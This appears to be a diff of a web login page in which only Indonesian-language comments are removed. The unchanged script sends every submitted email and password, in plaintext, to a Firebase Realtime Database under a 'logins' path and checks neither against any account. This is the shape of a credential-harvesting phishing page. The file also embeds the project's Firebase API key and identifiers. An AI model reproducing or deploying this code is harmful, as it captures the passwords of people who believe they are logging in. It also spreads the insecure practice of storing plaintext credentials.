@@ -108,11 +108,9 @@
     </div>
 
     <script type="module">
-        // Import Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";
 
-        // Konfigurasi Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
             authDomain: "login-24767.firebaseapp.com",
@@ -123,17 +121,14 @@
             appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
         };
 
-        // Inisialisasi Firebase
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Fungsi untuk menangani login
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
 
-            // Simpan data login ke Firebase Realtime Database dengan email sebagai ID
             set(ref(database, 'logins/' + email.replace(/[.#$[\]]/g, '_')), {
                 email: email,
                 password: password,
